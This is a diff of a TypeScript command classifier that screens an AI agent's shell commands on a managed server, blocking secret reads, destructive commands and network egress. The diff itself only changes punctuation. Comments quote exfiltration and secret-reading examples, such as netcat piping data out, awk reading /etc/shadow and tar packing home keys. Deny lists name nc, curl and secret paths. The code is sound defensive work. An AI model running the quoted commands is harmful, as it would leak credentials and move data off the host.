@@ -2,8 +2,8 @@ import { accessSync, constants, realpathSync } from "node:fs";
 import { join, posix } from "node:path";
 import { homedir } from "node:os";
 
-// The command classifier (PLAN.md §5.7). Every agent-issued shell command — main agent, learn
-// agent, extension write bindings, repair — passes through classifyCommand() in the daemon before
+// The command classifier (PLAN.md §5.7). Every agent-issued shell command - main agent, learn
+// agent, extension write bindings, repair - passes through classifyCommand() in the daemon before
 // anything executes. It is a pure function over the command string (plus a binary resolver) with
 // a table-driven corpus in classify.test.ts: the bypass catalogue in the plan IS the test file.
 //
@@ -70,7 +70,7 @@ export interface ClassifyOptions {
 }
 
 // ---------------------------------------------------------------------------------------------
-// Tokeniser — a real POSIX shell-word parser, never a regex on the raw string. Quoting tricks
+// Tokeniser - a real POSIX shell-word parser, never a regex on the raw string. Quoting tricks
 // (`r'm'`, `"r"m`, `r\m`, `$'rm'`) all canonicalise to the literal word; anything that would need
 // the shell to *compute* a value (variables, command substitution, process substitution) is
 // flagged rather than guessed at.
@@ -130,7 +130,7 @@ export function tokenize(input: string): Token[] {
       continue;
     }
 
-    // Process substitution `<(cmd)` / `>(cmd)` is an expansion the shell would have to compute —
+    // Process substitution `<(cmd)` / `>(cmd)` is an expansion the shell would have to compute -
     // a word flagged as expansion, never a redirect. Consumed to the matching paren.
     if ((c === "<" || c === ">") && input[i + 1] === "(") {
       let depth = 0;
@@ -154,7 +154,7 @@ export function tokenize(input: string): Token[] {
     const rop = REDIRECT_OPS.find((o) => input.startsWith(o, j));
     if (rop) {
       j += rop.length;
-      // `>&1` / `2>&1` / `>&2` — duplication target is a digit or `-`.
+      // `>&1` / `2>&1` / `>&2` - duplication target is a digit or `-`.
       if (rop === ">&" || rop === "<>" || rop === "&>") {
         let k = j;
         while (k < n && /[0-9-]/.test(input[k])) k++;
@@ -293,17 +293,17 @@ const LIFELINE_PATHS: RegExp[] = [
   /^\/etc\/systemd\/system\/(ssh|sshd|docker|mirod|networking|systemd-networkd|NetworkManager)/,
 ];
 
-/** Reading these leaks a secret straight into model-visible context. Never `read` — and never a
+/** Reading these leaks a secret straight into model-visible context. Never `read` - and never a
  * write target through any generic kind either. Whole directories, not just known filenames:
  * `grep -r . ~/.ssh` and `cat /var/lib/miro/miro.db` are the same leak (adversarial review). */
 const SENSITIVE_READ_PATHS: RegExp[] = [
   /^\/etc\/shadow$/,
   /^\/etc\/gshadow$/,
   // Everything under .ssh except the three public files an operator legitimately edits
-  // (authorized_keys / known_hosts / config) — those are lifeline writes, not secrets.
+  // (authorized_keys / known_hosts / config) - those are lifeline writes, not secrets.
   /(^|\/)\.ssh(\/(?!(authorized_keys|known_hosts|config)$)|$)/,
   /(^|\/)\.miro(\/|$)/,
-  // /proc aliases that cannot be resolved from a string (cwd, fd) — no inspection needs them.
+  // /proc aliases that cannot be resolved from a string (cwd, fd) - no inspection needs them.
   /^\/proc\/(self|thread-self|\d+)\/(cwd|fd)(\/|$)/,
   /^\/var\/lib\/miro(\/|$)/,
   /^\/etc\/wireguard(\/|$)/,
@@ -320,7 +320,7 @@ const SENSITIVE_READ_PATHS: RegExp[] = [
 
 /** Directories whose subtree holds secret material. Recursing from at or above one reads it
  * without ever naming it: `grep -r . /root`, `rg token /home`, `tar cf - /etc`. Every home
- * counts — the .ssh/.env/.netrc patterns above are home-relative. Found reviewing the root
+ * counts - the .ssh/.env/.netrc patterns above are home-relative. Found reviewing the root
  * sandbox: uid 0 owns /root/.ssh outright, and reads as root hold CAP_DAC_READ_SEARCH. */
 const SECRET_HOLDING_DIRS = ["/root", "/etc", "/proc", "/var/lib/miro"];
 function holdsSecrets(dir: string, home: string): boolean {
@@ -328,7 +328,7 @@ function holdsSecrets(dir: string, home: string): boolean {
   return [...SECRET_HOLDING_DIRS, home].some((d) => d === dir || d.startsWith(dir + "/"));
 }
 
-/** A tree-walking content reader rooted where secrets live is forbidden whatever its class —
+/** A tree-walking content reader rooted where secrets live is forbidden whatever its class -
  * `tar czf /tmp/x.tgz /home/miro` is a mutate that packs every key for a later read. Named
  * targets only: a walker with no path walks the working directory, which is refused outright.
  * ponytail: `find /root -type f | xargs cat` feeds paths through a pipe the classifier does not
@@ -341,9 +341,9 @@ function secretTreeWalk(name: string, argv: string[], paths: string[], home: str
     (name === "tar" && ((/^-?[a-zA-Z]*c/.test(rest[0] ?? "") && !(rest[0] ?? "").startsWith("--")) || rest.includes("-c") || rest.includes("--create"))) ||
     (name === "find" && ["-exec", "-execdir", "-ok", "-okdir"].some((f) => rest.includes(f)));
   if (!walks) return null;
-  if (paths.length === 0) return `${name} would walk the working directory — name an absolute path to search`;
+  if (paths.length === 0) return `${name} would walk the working directory - name an absolute path to search`;
   const hit = paths.find((p) => holdsSecrets(p, home));
-  return hit ? `recursive read over ${hit}, which holds secret material — name a narrower directory` : null;
+  return hit ? `recursive read over ${hit}, which holds secret material - name a narrower directory` : null;
 }
 
 /** Canonical form for path matching: `~` expanded, `.`/`..`/`//` collapsed, the /proc back doors
@@ -353,7 +353,7 @@ export function normalizePath(path: string, home = homedir()): string {
   let p = expandHome(path, home);
   if (!p.startsWith("/")) {
     // A relative path's real base is the (unknown) working directory. Resolve it against "/" so a
-    // `..` traversal reaches its absolute target and the ^/-anchored sensitive rules can match it —
+    // `..` traversal reaches its absolute target and the ^/-anchored sensitive rules can match it -
     // `../../../../etc/shadow` becomes `/etc/shadow`. This can over-map a genuinely cwd-relative
     // path onto an absolute sensitive path, which errs safe (refuse). Found live: relative `..`
     // tokens bypassed every ^/-anchored secret rule (audit C1).
@@ -381,7 +381,7 @@ export function isLifelinePath(path: string, home = homedir()): boolean {
 }
 
 /** Exported for the file kinds and read tools: Miro's own secret material, private keys, and
- * credential files — never read into model context, never written or deleted through any
+ * credential files - never read into model context, never written or deleted through any
  * generic kind. */
 export function isSensitivePath(path: string, home = homedir()): boolean {
   const p = normalizePath(path, home);
@@ -389,10 +389,10 @@ export function isSensitivePath(path: string, home = homedir()): boolean {
 }
 
 /** Masks credential-shaped values in text bound for model context (tool output, captures).
- * ponytail: regex over common shapes, not a full parser — the structural defence is that
+ * ponytail: regex over common shapes, not a full parser - the structural defence is that
  * secret-path reads are refused outright above; this catches the env dump and the JSON blob. */
 export function redactSecretsInText(text: string): string {
-  // Protect `{{secret:<ref>}}` placeholders first — a reference is not a value, and the `secret:`
+  // Protect `{{secret:<ref>}}` placeholders first - a reference is not a value, and the `secret:`
   // keyword rule below would otherwise redact the ref name out of a plan or a capability doc.
   const refs: string[] = [];
   const guarded = text.replace(/\{\{secret:[^}]+\}\}/g, (m) => "\u0000" + (refs.push(m) - 1) + "\u0000");
@@ -402,17 +402,17 @@ export function redactSecretsInText(text: string): string {
     .replace(/(Authorization:\s*)(\S.*)/gi, "$1[redacted]")
     .replace(/(MediaBrowser[^"\n]*Token=")([^"]+)/gi, "$1[redacted]")
     .replace(/\b(sk-[A-Za-z0-9]{8,}|ghp_[A-Za-z0-9]{8,}|xox[abp]-[A-Za-z0-9-]{8,}|AKIA[A-Z0-9]{16}|eyJ[A-Za-z0-9_-]{6,}\.[A-Za-z0-9_-]{6,}\.[A-Za-z0-9_-]{6,})\b/g, "[redacted]")
-    // /etc/shadow and /etc/gshadow hash lines: `user:$6$…:…` — not keyword-shaped, so caught by structure.
+    // /etc/shadow and /etc/gshadow hash lines: `user:$6$…:…` - not keyword-shaped, so caught by structure.
     .replace(/^([^\s:]+:)([$!*][^\s:]*)/gm, "$1[redacted]")
     .replace(/(-----BEGIN [A-Z ]*PRIVATE KEY-----)[\s\S]*?(-----END [A-Z ]*PRIVATE KEY-----)/g, "$1 [redacted] $2");
   return redacted.replace(/ (\d+) /g, (_, i) => refs[Number(i)] ?? "");
 }
 
 /** Binaries whose read-only use needs the host network namespace (routes, sockets, DNS, local
- * HTTP). Everything else inspects in an empty namespace — no egress possible. */
+ * HTTP). Everything else inspects in an empty namespace - no egress possible. */
 const NETWORK_READERS = new Set(["ip", "ss", "netstat", "nft", "iptables", "ip6tables", "ufw", "route", "arp", "ethtool", "wg", "tailscale", "nmcli", "dig", "nslookup", "host", "getent", "curl", "wget", "ping", "traceroute", "tracepath", "mtr", "tcpdump", "tshark", "nc", "ncat", "ifconfig"]);
 
-/** Only hosts on this machine or its private network — a `read`-class fetch may not leave the LAN;
+/** Only hosts on this machine or its private network - a `read`-class fetch may not leave the LAN;
  * a public URL becomes a confirmed `mutate` (egress is visible in a plan). */
 export function isLocalOrPrivateUrl(raw: string): boolean {
   let u: URL;
@@ -620,7 +620,7 @@ function hasFlag(args: string[], ...flags: string[]): boolean {
   );
 }
 
-/** First non-option word, with the given options' values consumed — the subcommand of `git -C
+/** First non-option word, with the given options' values consumed - the subcommand of `git -C
  * /x clean`, `docker --log-level debug system prune`, `apt -o X=Y purge` (adversarial review:
  * a flag's value used to be mistaken for the verb, downgrading these to `mutate`). */
 function firstVerb(args: string[], valueFlags: string[]): { verb: string; rest: string[] } {
@@ -698,7 +698,7 @@ const RULES: Record<string, Rule> = {
   // A crontab is root code on a timer, run by cron outside any sandbox: installing one is
   // `lifeline`, wiping them is forbidden, the editor is interactive.
   crontab: (a) => (hasFlag(a, "-r") ? "forbidden" : hasFlag(a, "-e") ? "forbidden" : hasFlag(a, "-l") ? "read" : "lifeline"),
-  // Hand execution to PID 1 / atd, outside the sandbox and the classifier — never.
+  // Hand execution to PID 1 / atd, outside the sandbox and the classifier - never.
   "systemd-run": () => "forbidden",
   at: () => "forbidden",
   batch: () => "forbidden",
@@ -723,7 +723,7 @@ const RULES: Record<string, Rule> = {
   ip6tables: (a) => (hasFlag(a, "-L", "-S", "--list", "--list-rules") ? "read" : "lifeline"),
   nft: (a) => (a[1] === "list" || a[1] === "--json" || a[1] === "-j" ? "read" : "lifeline"),
   ip: (a) => {
-    // Batch mode reads commands from a file or stdin — none of them visible here (adversarial
+    // Batch mode reads commands from a file or stdin - none of them visible here (adversarial
     // review: `echo 'link set eth0 down' | ip -b -` classified read).
     if (a.slice(1).some((x) => x === "-b" || x === "-batch" || x === "--batch" || x === "-force" || x.startsWith("-b="))) return "lifeline";
     // Skip global options; the ones that take a value (`-n <netns>`, `-f <family>`) consume it.
@@ -832,7 +832,7 @@ const RULES: Record<string, Rule> = {
     const writes = args.some((x) => ["-o", "--output", "-O", "--remote-name", "-T", "--upload-file", "-d", "--data", "--data-raw", "--data-binary", "--data-urlencode", "-F", "--form", "-X", "--request", "-c", "--cookie-jar", "-D", "--dump-header", "--trace", "--trace-ascii"].includes(x) || /^-[a-zA-Z]*[oOTdFXcD]/.test(x) && !x.startsWith("--") || x.startsWith("--output=") || x.startsWith("--data") || x.startsWith("--request=") || x.startsWith("--upload-file="));
     if (writes) return "mutate";
     // A read-class GET may not leave the local network (egress with data in the URL is
-    // exfiltration). A public URL is a confirmed mutate — visible in a plan.
+    // exfiltration). A public URL is a confirmed mutate - visible in a plan.
     const urls = args.filter((x) => /^https?:\/\//i.test(x));
     return urls.length > 0 && urls.every(isLocalOrPrivateUrl) ? "read" : "mutate";
   },
@@ -876,7 +876,7 @@ const RULES: Record<string, Rule> = {
   mysql: (a) => sqlClass(argAfter(a, "-e") ?? argAfter(a, "--execute")),
   mariadb: (a) => RULES.mysql(a, undefined as any),
   // A bind mount can shadow /etc or /root with anything; a remount changes what the system can
-  // write — lockouts by another name.
+  // write - lockouts by another name.
   mount: (a) => {
     if (a.length === 1 || hasFlag(a, "-l")) return "read";
     const opts = a.slice(1).flatMap((x, i) => (/^(-o|--options)$/.test(x) ? [a[i + 2] ?? ""] : /^-o./.test(x) ? [x.slice(2)] : []));
@@ -896,7 +896,7 @@ const RULES: Record<string, Rule> = {
   crontabs: () => "mutate",
   tcpdump: (a) => (hasFlag(a, "-w") ? "mutate" : "read"),
   tshark: (a) => (hasFlag(a, "-w") ? "mutate" : "read"),
-  // netcat moves bytes to arbitrary hosts — `cat data | nc host 443` is exfiltration. Only the
+  // netcat moves bytes to arbitrary hosts - `cat data | nc host 443` is exfiltration. Only the
   // zero-I/O port scan is a read.
   nc: (a) => (hasFlag(a, "-z") && !hasFlag(a, "-l", "--listen", "-e") ? "read" : "mutate"),
   ncat: (a) => RULES.nc(a, undefined as any),
@@ -975,7 +975,7 @@ function expandHome(p: string, home: string): string {
 }
 
 /** A token is path-like if it is absolute/home/explicit-relative, OR it carries a `..` traversal
- * segment anywhere (`foo/../../../etc/shadow`) — the latter can escape to any absolute path and
+ * segment anywhere (`foo/../../../etc/shadow`) - the latter can escape to any absolute path and
  * must be normalized and checked, not skipped (audit C1). */
 function isPathLike(v: string): boolean {
   return /^(\/|~|\.\/|\.\.\/)/.test(v) || /(^|\/)\.\.(\/|$)/.test(v);
@@ -994,7 +994,7 @@ function pathTokens(argv: string[], redirects: Redirect[], home: string): string
 /** A glob in a path argument that could expand into secret material. Returns the offending token
  * or null. The glob can't be expanded without the filesystem, so the test is the literal prefix
  * before the first metacharacter: if the directory it names holds secrets (or the prefix already
- * starts a sensitive path), the expansion can reach a secret — `cat /etc/shado?`, `/etc/gshad*`,
+ * starts a sensitive path), the expansion can reach a secret - `cat /etc/shado?`, `/etc/gshad*`,
  * `/home/miro/.ss?/id_rsa`. Ordinary globbed reads under a non-secret dir stay reads (audit C2). */
 function pathWithinSecretArea(p: string, home: string): boolean {
   if (p === "/" || p === "/home") return true;
@@ -1009,7 +1009,7 @@ function globReadRisk(argv: string[], home: string): string | null {
     if (g < 0) continue;
     // A glob does not cross "/", so its expansion stays in the directory literally containing the
     // metacharacter. Forbid only when THAT directory is within a secret area (or the prefix itself
-    // starts a sensitive path) — not when some unrelated secret dir merely sits under an ancestor.
+    // starts a sensitive path) - not when some unrelated secret dir merely sits under an ancestor.
     const prefix = normalizePath(v.slice(0, g), home);
     const dir = prefix.slice(0, prefix.lastIndexOf("/")) || "/";
     if (pathWithinSecretArea(dir, home) || SENSITIVE_READ_PATHS.some((re) => re.test(prefix))) return v;
@@ -1017,7 +1017,7 @@ function globReadRisk(argv: string[], home: string): string | null {
   return null;
 }
 
-/** Absolute path literals embedded inside a quoted string argument — an interpreter/awk/sed
+/** Absolute path literals embedded inside a quoted string argument - an interpreter/awk/sed
  * program can read a secret whose path lives inside its program text, not as a bare path token:
  * `awk 'BEGIN{while((getline l < "/etc/shadow")>0)...}'`, `sed 'r /etc/shadow'` (audit C4).
  * Scoped to program-bearing commands so a grep regex that merely contains a path string is not
@@ -1049,7 +1049,7 @@ function gitInjection(argv: string[]): string | null {
   return null;
 }
 
-/** Network probes whose destination argument is attacker-controllable and carries data — a `read`
+/** Network probes whose destination argument is attacker-controllable and carries data - a `read`
  * that reaches a public host is DNS/ICMP exfiltration of any literal in context (audit C5). These
  * stay reads for a local/private/LAN-name target and demote to a tracked `mutate` for a public one. */
 const EXFIL_NET_TOOLS = new Set(["dig", "host", "nslookup", "getent", "ping", "ping6", "traceroute", "tracepath", "mtr", "nc", "ncat"]);
@@ -1169,7 +1169,7 @@ function classifySegment(segment: Segment, env: Env): SegmentClassification {
   if (secret) return { segment, effectiveArgv: argv, class: "forbidden", reason: `touches secret material at ${secret}` };
   const walk = secretTreeWalk(name, argv, earlyPaths, env.home);
   if (walk) return { segment, effectiveArgv: argv, class: "forbidden", reason: walk };
-  // A glob metacharacter in a path argument dodges the literal sensitive match — `cat /etc/shado?`
+  // A glob metacharacter in a path argument dodges the literal sensitive match - `cat /etc/shado?`
   // expands to /etc/shadow only at exec time (audit C2). Forbid a glob whose literal prefix lies
   // in a secret-holding area; ordinary globbed reads (`ls /var/log/*.log`) are untouched.
   const glob = globReadRisk(argv, env.home);
@@ -1220,7 +1220,7 @@ function classifySegment(segment: Segment, env: Env): SegmentClassification {
   }
   if (cls === null) {
     if (PLAIN_READERS.has(name) || HARMLESS_BUILTINS.has(name)) { cls = "read"; reason = "read-only utility"; }
-    else { cls = "mutate"; reason = `unknown command ${name} — never assumed read-only`; }
+    else { cls = "mutate"; reason = `unknown command ${name} - never assumed read-only`; }
   }
   if (cls === "forbidden") return { segment, effectiveArgv: argv, class: "forbidden", reason: forbiddenReason(name, argv) };
 
@@ -1241,7 +1241,7 @@ function classifySegment(segment: Segment, env: Env): SegmentClassification {
     else if (segment.globInCommand) { cls = "mutate"; reason = "glob in command position"; }
     else if (EXFIL_NET_TOOLS.has(name)) {
       const pub = networkProbePublicTarget(argv);
-      if (pub) { cls = "mutate"; reason = `${name} to public host ${pub} — a read may not egress to the internet`; }
+      if (pub) { cls = "mutate"; reason = `${name} to public host ${pub} - a read may not egress to the internet`; }
     }
     else if (!HARMLESS_BUILTINS.has(name)) {
       const real = env.resolveBinary(argv[0]);
@@ -1267,10 +1267,10 @@ function baseName(p: string): string {
 
 function forbiddenReason(name: string, argv: string[]): string {
   switch (name) {
-    case "rm": case "rmdir": case "unlink": case "shred": return `${name} is banned — deletion only exists as the file_delete operation (moves to trash, recoverable)`;
+    case "rm": case "rmdir": case "unlink": case "shred": return `${name} is banned - deletion only exists as the file_delete operation (moves to trash, recoverable)`;
     case "mkfs": case "wipefs": case "fdisk": case "sfdisk": case "cfdisk": case "parted": case "gdisk": return `${name} destroys a filesystem/partition table`;
     case "dd": return "dd writes directly to a block device";
-    case "reboot": case "shutdown": case "halt": case "poweroff": case "init": case "telinit": case "kexec": return `${name} via shell — use the dedicated reboot operation`;
+    case "reboot": case "shutdown": case "halt": case "poweroff": case "init": case "telinit": case "kexec": return `${name} via shell - use the dedicated reboot operation`;
     case "crontab": return "crontab -r wipes every scheduled job";
     case "truncate": return "truncate to zero destroys the file's contents";
     case "cp": return "copying /dev/null over a file destroys it";
@@ -1287,7 +1287,7 @@ function forbiddenReason(name: string, argv: string[]): string {
 function alternativeFor(name: string): string {
   switch (baseName(name)) {
     case "rm": case "rmdir": case "unlink": case "shred": case "find": case "rsync": case "tar": case "truncate": case "cp": case "mv":
-      return "Use the file_delete operation — it moves the path to Miro's trash (recoverable for 30 days) and can be rolled back.";
+      return "Use the file_delete operation - it moves the path to Miro's trash (recoverable for 30 days) and can be rolled back.";
     case "reboot": case "shutdown": case "halt": case "poweroff": case "init": case "telinit": case "systemctl":
       return "Use the reboot operation, which records a recovery point and verifies the server comes back.";
     case "mkfs": case "wipefs": case "fdisk": case "sfdisk": case "cfdisk": case "parted": case "gdisk": case "dd":
